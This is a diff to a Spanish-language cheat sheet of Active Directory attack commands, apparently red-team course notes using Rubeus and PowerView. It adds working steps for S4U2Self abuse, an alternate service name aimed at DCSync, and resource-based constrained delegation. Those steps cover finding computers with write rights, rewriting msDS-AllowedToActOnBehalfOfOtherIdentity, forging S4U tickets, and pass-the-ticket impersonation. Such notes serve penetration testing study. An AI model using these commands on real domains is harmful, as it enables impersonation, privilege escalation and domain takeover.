@@ -366,8 +366,35 @@ Impersonar un proceso con el ticket
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain: /username:usuario_a_impersonar /password:FakePass /ticket:
 ```
 
-## Alternate Service Name (en caso de que el puerto 445 este cerrado)
+## Alternate Service Name (en caso de que el puerto 445 este cerrado. Realizar DCSync)
 
 ```
-execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:servicio/equipo /altservice:ldap /user:maquina /ticket:doIFpD[...]MuSU8= /nowrap
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:servicio/equipo /altservice:ldap /user:equipo$ /ticket:doIFpD[...]MuSU8= /nowrap
 ```
+## S4U2Self Abuse (UD no funciona porque el usuario esta logueado)
+
+```
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:usuario /self /altservice:servicio/equipo /user:equipo$ /ticket: /nowrap
+```
+## Resource-Based Constrained Delegatoin (SeEnablePrivilege)
+Enumerar los equipos vulnerables
+```
+powershell Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }
+```
+Obtener el SID
+```
+powershell Get-DomainComputer -Identity wkstn-2 -Properties objectSid
+```
+Cambiar el contenido de "msDS-AllowedToActOnBehalfOfOtherIdentity"
+```
+powershell $rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SID)"; $rsdb = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($rsdb, 0); Get-DomainComputer -Identity "dc-2" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb} -Verbose
+```
+Usar el TGT del equipo vulnerable
+```
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:WKSTN-2$ /impersonateuser:usuario_a_impersonar /msdsspn:servicio\/equipo /ticket: /nowrap
+```
+PTT
+```
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:dominio /username:usuario_impersonado /password:FakePass /ticket:
+```
+## Shadow Credentials
